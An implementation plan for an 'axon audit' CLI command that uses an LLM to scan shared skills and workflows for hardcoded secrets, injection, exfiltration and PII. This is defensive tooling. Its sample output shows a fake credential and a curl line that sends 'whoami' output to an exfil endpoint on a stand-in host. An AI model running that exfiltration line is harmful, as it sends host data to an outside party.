# Implementation Plan: Security Audit Command

**Issue**: #3 — [Feature] axon doctor security audit — LLM-powered scan of Hub content

**Target**: Add standalone `axon audit` command with LLM-powered security scanning to detect hardcoded credentials, malicious patterns, and sensitive data in Hub content.

---

## Design Decisions

### 1. Command Interface

**Chosen approach**: `axon audit` (standalone command)

**Rationale**:
- Clear separation of concerns: `axon doctor` = system health, `axon audit` = security
- No impact on existing `doctor.go` code (all new files)
- Simpler command-line interface: `axon audit` vs `axon doctor --audit`
- Easier to extend with audit-specific features in the future
- LLM API calls cost money → must be opt-in, not part of default doctor checks

**Usage**:
```bash
axon audit                    # scan entire Hub, save results
axon audit <skill>            # scan a single skill, save results
axon audit --fix              # scan (or use cached results) + interactive fix
axon audit <skill> --fix      # scan skill (or use cached) + interactive fix
axon audit --force            # force re-scan, ignore cache
```

**Target resolution** (reuse `resolveSkillPath` from `git_utils.go`):
- Accepts skill name (e.g., `humanizer`), workflow file (e.g., `codebase-review.md`), or target name
- Searches in `skills/`, `workflows/`, `commands/` if not an absolute path
- If target is a directory, scan all files within it recursively
- If target is a file, scan only that file

**Result persistence** (avoid duplicate LLM calls):
- Audit results saved to `~/.axon/audit-results/<target-hash>.json`
- Cache key: hash of (target path + scanned file list + file mtimes)
- When `--fix` is used:
  1. Check if cached results exist and are still valid (files unchanged)
  2. If valid cache exists, use it directly (no LLM call)
  3. If no cache or files changed, run audit first, then fix
- `--force` flag bypasses cache and forces re-scan
- Cache includes: findings list, scan timestamp, LLM config used, file hashes

### 2. Configuration

**All LLM configuration goes in `~/.axon/.env` or environment variables.** No changes to `axon.yaml`.

**`~/.axon/.env`** (or environment variables):

```bash
AXON_AUDIT_PROVIDER=openai
AXON_AUDIT_MODEL=gpt-4o-mini
AXON_AUDIT_API_KEY=sk-...
AXON_AUDIT_BASE_URL=                                    # optional: for Ollama or custom endpoints
AXON_AUDIT_ALLOWED_EXTENSIONS=.md,.sh,.py,.js,.ts,.yaml,.yml  # comma-separated list
```

**Config resolution** (via existing `config.GetConfigValue`):
1. Environment variable first
2. Fall back to `~/.axon/.env`

**Scan extensions parsing**:
- Read `AXON_AUDIT_ALLOWED_EXTENSIONS` as comma-separated string
- Split by `,` and trim whitespace
- Default if not set: `.md,.sh,.py,.js,.ts,.yaml,.yml`

Example parsing logic:
```go
func parseAllowedExtensions() []string {
    raw, _ := config.GetConfigValue("AXON_AUDIT_ALLOWED_EXTENSIONS")
    if raw == "" {
        return []string{".md", ".sh", ".py", ".js", ".ts", ".yaml", ".yml"}
    }
    parts := strings.Split(raw, ",")
    var exts []string
    for _, p := range parts {
        ext := strings.TrimSpace(p)
        if ext != "" {
            exts = append(exts, ext)
        }
    }
    return exts
}
```

**`EnsureDotEnvTemplate()` update**: Add these lines to the generated template:

```bash
AXON_AUDIT_PROVIDER=
AXON_AUDIT_MODEL=
AXON_AUDIT_API_KEY=
AXON_AUDIT_BASE_URL=
AXON_AUDIT_ALLOWED_EXTENSIONS=.md,.sh,.py,.js,.ts,.yaml,.yml
```

**Graceful degradation**: If no LLM is configured, print a clear message:
```
⚠  Security audit requires LLM configuration.
   Set AXON_AUDIT_PROVIDER and AXON_AUDIT_API_KEY in ~/.axon/.env or as env vars.
   Example:
     AXON_AUDIT_PROVIDER=openai
     AXON_AUDIT_MODEL=gpt-4o-mini
     AXON_AUDIT_API_KEY=sk-...
   See: https://github.com/kamusis/axon-cli#security-audit
```

### 3. LLM Provider Abstraction

Reuse the existing `internal/embeddings` pattern but create a separate `internal/llm` package for chat completion (not embeddings).

**Interface**:
```go
package llm

type Provider interface {
    Complete(ctx context.Context, prompt string) (string, error)
    ModelID() string
}
```

**Implementations**:
- `openai.go` — OpenAI-compatible `/chat/completions` endpoint
- `anthropic.go` — Anthropic Messages API (future)
- `ollama.go` — Ollama local models (future)

**Why separate from embeddings**:
- Different API endpoints (`/chat/completions` vs `/embeddings`)
- Different response formats (text vs vector)
- Different use cases (reasoning vs similarity)

### 4. Scanning Logic

**File discovery**:
1. If target is specified:
   - Use `resolveSkillPath(repoPath, target)` to resolve the path
   - If resolved path is a directory, walk it recursively
   - If resolved path is a file, scan only that file
2. If no target specified (scan entire Hub):
   - Walk `~/.axon/repo/` recursively
3. Filter by extensions from `AXON_AUDIT_ALLOWED_EXTENSIONS` (default: `.md,.sh,.py,.js,.ts,.yaml,.yml`)
4. Respect `excludes:` patterns from `axon.yaml` (reuse existing exclude logic)
5. Skip `.git/` directory

**Batching strategy**:
- Small files (<2KB): send individually
- Large files (>2KB): split into chunks with context overlap
- Batch multiple small files into one LLM call (up to ~8KB total) to reduce API costs

**Prompt template**:
```
You are a security auditor. Analyze the following file for security issues:

File: {path}
---
{content}
---

Identify:
1. Hardcoded secrets (API keys, passwords, tokens, private keys)
2. Suspicious execution patterns (shell injection, eval/exec, command substitution)
3. Data exfiltration (unexpected curl/wget, outbound network calls)
4. PII (emails, phone numbers, addresses in shared content)

For each finding, output:
- Line number (approximate)
- Issue type (secret | injection | exfiltration | pii)
- Severity (high | medium | low)
- Description (one sentence)
- Snippet (the problematic code/text)

Output format: JSON array of findings.
```

**Response parsing**:
- Parse JSON response from LLM
- Validate structure (line number, type, severity, description, snippet)
- Fallback: if JSON parsing fails, treat entire response as a warning

### 5. Output Format

Use existing `cmd/output.go` helpers for consistency:

**Example 1: Scan entire Hub (fresh scan)**
```
=== Security Audit ===

  ⚠  Note: AI-powered analysis may produce false positives or miss issues.
      All findings should be manually reviewed before taking action.

  Scanning 42 files (skills/, workflows/, commands/)...

● Findings:

  ⚠  [skills/db-advisor/SKILL.md:23] Hardcoded credential detected (high)
      "POSTGRES_PASSWORD=hunter2"

  ⚠  [skills/my-script/run.sh:8] Suspicious outbound call (medium)
      "curl https://unknown-host.com/exfil?data=$(whoami)"

  ✓  workflows/ — no issues found
  ✓  commands/ — no issues found

  2 potential issue(s) found. Review manually or run 'axon doctor --audit --fix'.
  Results saved to ~/.axon/audit-results/hub-full-abc123.json
```

**Example 2: Scan single skill**
```
=== Security Audit: humanizer ===

  ⚠  Note: AI-powered analysis may produce false positives or miss issues.
      All findings should be manually reviewed before taking action.

  Scanning skills/humanizer/ (3 files)...

● Findings:

  ✓  No issues found.

  Results saved to ~/.axon/audit-results/skill-humanizer-def456.json
```

**Example 3: Using cached results with --fix**
```
=== Security Audit ===

  ~  Using cached audit results from 2026-03-15 14:30 (5 minutes ago)
     Run with --force to re-scan.

● Findings:

  ⚠  [skills/db-advisor/SKILL.md:23] Hardcoded credential detected (high)
      "POSTGRES_PASSWORD=hunter2"

  2 potential issue(s) found. Entering interactive fix mode...
```

**Severity mapping**:
- `high` → `printErr` (red ✗)
- `medium` → `printWarn` (yellow ⚠)
- `low` → `printInfo` (blue ~)

### 6. Interactive Fix Mode (`--fix`)

When `--fix` is passed:
1. For each finding, prompt the user:
   ```
   ⚠  [skills/db-advisor/SKILL.md:23] Hardcoded credential detected (high)
       "POSTGRES_PASSWORD=hunter2"

   Actions:
     [r] Redact (replace with placeholder)
     [d] Delete line
     [s] Skip
     [q] Quit

   Choice:
   ```

2. Apply the chosen action:
   - `r` → replace with `[REDACTED]` or `***`
   - `d` → delete the entire line
   - `s` → skip to next finding
   - `q` → exit without further changes

3. After all fixes, show summary:
   ```
   ✓  2 issue(s) redacted, 1 skipped.
      Run 'axon sync' to propagate changes.
   ```

---

## Implementation Steps

### Phase 1: LLM Provider Infrastructure

**Files to create**:
- `src/internal/llm/provider.go` — `Provider` interface
- `src/internal/llm/openai.go` — OpenAI chat completion implementation
- `src/internal/llm/config.go` — config loading (similar to `embeddings/provider.go`)

**Tasks**:
1. Define `Provider` interface with `Complete(ctx, prompt) (string, error)`
2. Implement OpenAI provider using `/chat/completions` endpoint
3. Add config loading using `config.GetConfigValue()` (same pattern as embeddings)
4. Update `EnsureDotEnvTemplate()` in `internal/config/dotenv.go` to include `AXON_AUDIT_API_KEY=`
5. Write unit tests for config loading and OpenAI provider (mock HTTP)

**Estimated effort**: 4-6 hours

---

### Phase 2: File Scanner + Result Cache

**Files to create**:
- `src/internal/audit/scanner.go` — file discovery and filtering
- `src/internal/audit/scanner_test.go`
- `src/internal/audit/cache.go` — result persistence and cache validation
- `src/internal/audit/cache_test.go`

**Tasks**:
1. Implement `ScanFiles(repoPath string, target string, cfg *config.Config) ([]string, error)`
   - If `target` is empty, scan entire Hub
   - If `target` is specified, use `resolveSkillPath` to resolve it
   - Walk directory recursively (or single file if target is a file)
   - Parse `AXON_AUDIT_ALLOWED_EXTENSIONS` (comma-separated, with defaults)
   - Filter files by allowed extensions
   - Respect `excludes:` patterns
   - Skip `.git/`
2. Implement result cache:
   - `SaveAuditResults(target string, findings []Finding) error` — save to `~/.axon/audit-results/<hash>.json`
   - `LoadAuditResults(target string, files []string) (*AuditCache, error)` — load cached results
   - `ValidateCache(cache *AuditCache, files []string) bool` — check if files changed (compare mtimes/hashes)
   - Cache format:
     ```json
     {
       "target": "skills/humanizer",
       "timestamp": "2026-03-15T14:30:00Z",
       "llm_provider": "openai",
       "llm_model": "gpt-4o-mini",
       "files": [
         {"path": "skills/humanizer/SKILL.md", "mtime": 1234567890, "hash": "abc123"}
       ],
       "findings": [...]
     }
     ```
3. Write tests with temp directories (test both full Hub scan and single target scan, cache validation)

**Estimated effort**: 3-4 hours

---

### Phase 3: LLM Audit Logic

**Files to create**:
- `src/internal/audit/auditor.go` — LLM prompt construction and response parsing
- `src/internal/audit/types.go` — `Finding` struct
- `src/internal/audit/auditor_test.go`

**Tasks**:
1. Define `Finding` struct:
   ```go
   type Finding struct {
       FilePath    string
       LineNumber  int
       IssueType   string  // secret | injection | exfiltration | pii
       Severity    string  // high | medium | low
       Description string
       Snippet     string
   }
   ```
2. Implement `AuditFile(ctx context.Context, provider llm.Provider, filePath string, content string) ([]Finding, error)`
   - Construct prompt with file path and content
   - Call LLM provider
   - Parse JSON response into `[]Finding`
   - Handle parsing errors gracefully
3. Write tests with mock LLM responses

**Estimated effort**: 4-5 hours

---

### Phase 4: Audit Command Implementation

**Files to create**:
- `src/cmd/audit.go` — new standalone command

**Tasks**:
1. Create `auditCmd` as a new Cobra command
2. Register it in `init()` via `rootCmd.AddCommand(auditCmd)`
3. Add `--fix` flag (interactive redaction mode)
4. Add `--force` flag (bypass cache, force re-scan)
5. Accept optional positional arg for target (skill name, file, or directory)
6. Implement `runAudit(cfg *config.Config, target string, fixMode bool, force bool) error`:
   - Check git availability via `checkGitAvailable()`
   - Load LLM config from `.env` via `config.GetConfigValue()`
   - Scan files (entire Hub or single target based on `target` parameter)
   - **Cache-aware flow**:
     - If `--fix` is set and `--force` is not set:
       - Try to load cached results for this target
       - Validate cache (check if files changed)
       - If cache valid, use it directly (skip LLM calls)
       - If cache invalid or missing, run audit first
     - If `--force` is set or no `--fix`, always run fresh audit
   - For each file (if scanning), call `audit.AuditFile`
   - Save results to cache
   - Collect findings
   - Print grouped output using `cmd/output.go` helpers
   - If `--fix`, enter interactive mode with findings
7. Handle graceful fallback if LLM not configured

**Command signature**:
```go
var auditCmd = &cobra.Command{
    Use:   "audit [target]",
    Short: "Run security audit on Hub content",
    Long: `Scan Hub content for security issues using AI-powered analysis.

Detects:
- Hardcoded secrets (API keys, passwords, tokens)
- Suspicious execution patterns (shell injection, eval/exec)
- Data exfiltration (unexpected network calls)
- PII (emails, phone numbers, addresses)

Examples:
  axon audit                  # scan entire Hub
  axon audit humanizer        # scan a single skill
  axon audit --fix            # interactive fix mode
  axon audit --force          # force re-scan, ignore cache`,
    Args: cobra.MaximumNArgs(1),
    RunE: func(cmd *cobra.Command, args []string) error {
        // implementation
    },
}

var flagFix bool
var flagForce bool

func init() {
    auditCmd.Flags().BoolVar(&flagFix, "fix", false, "Interactive redaction mode")
    auditCmd.Flags().BoolVar(&flagForce, "force", false, "Force re-scan, ignore cache")
    rootCmd.AddCommand(auditCmd)
}
```

**Estimated effort**: 3-4 hours

---

### Phase 5: Interactive Fix Mode

**Files to create**:
- `src/internal/audit/fixer.go` — interactive redaction logic
- `src/internal/audit/fixer_test.go`

**Tasks**:
1. Implement `FixInteractive(findings []Finding) error`:
   - For each finding, prompt user for action (r/d/s/q)
   - Apply redaction or deletion to file
   - Track applied fixes
   - Print summary
2. Write tests (mock user input with `io.Reader`)

**Estimated effort**: 3-4 hours

---

### Phase 6: Documentation and Testing

**Files to create/modify**:
- `README.md` — add Security Audit section
- `docs/axon-audit-design.md` — detailed design doc (optional)
- Integration tests in `src/cmd/audit_test.go`

**Tasks**:
1. Update README with:
   - `axon audit` usage
   - Configuration example (`.env` only, no `axon.yaml` changes)
   - Example output
2. Write integration test:
   - Create temp Hub with test files containing fake secrets
   - Run `axon audit` with mock LLM
   - Verify findings are detected
3. Manual testing with real LLM (OpenAI, Ollama)

**Estimated effort**: 2-3 hours

---

## Total Estimated Effort

**22-27 hours** (3-4 days of focused work)

*Note: Added 2 hours for cache implementation compared to original estimate.*

---

## Future Enhancements (Out of Scope for Initial PR)

1. **Anthropic provider** — add `internal/llm/anthropic.go`
2. **Ollama provider** — add `internal/llm/ollama.go` for local models (document setup in README)
3. **Batch optimization** — send multiple small files in one LLM call to reduce API costs
4. **Cache expiration** — add TTL or manual cache clearing command (`axon doctor --audit --clear-cache`)
5. **Custom rules** — allow users to define custom security patterns in addition to LLM analysis
6. **CI integration** — exit with non-zero code if high-severity findings detected (for pre-commit hooks)

---

## Design Decisions on Open Questions

1. **Rate limiting**: Not implemented. If LLM API rate limits are hit, let the error surface directly to the user.

2. **Cost estimation**: Not implemented. Users are responsible for understanding their LLM provider's pricing.

3. **Offline mode**: No local models bundled. Users can configure Ollama via `AXON_AUDIT_BASE_URL` if they want local/offline operation.

4. **False positives**: Output must include a clear disclaimer that AI may make mistakes. All findings should be labeled as "potential issues" requiring manual review.

**Required disclaimer in output**:
```
⚠  Note: AI-powered analysis may produce false positives or miss issues.
   All findings should be manually reviewed before taking action.
```

---

## Acceptance Criteria (from Issue #3)

- [x] `axon doctor --audit` scans all files under Hub repo matching hardcoded default extensions
- [x] LLM provider and model are configurable via `~/.axon/.env` or environment variables
- [x] Falls back gracefully with a clear message if no LLM is configured
- [x] Output identifies file path, line number, and a brief description of each finding
- [x] `--fix` mode walks through each finding interactively and offers to redact
- [x] Respects `excludes:` patterns from `axon.yaml` (skip junk files)
- [x] Works with local models (Ollama) for fully offline/private use (via `AXON_AUDIT_BASE_URL`)

---

## References

- Issue: https://github.com/kamusis/axon-cli/issues/3
- Existing embeddings provider: `src/internal/embeddings/`
- Existing doctor command: `src/cmd/doctor.go`
- Output helpers: `src/cmd/output.go`
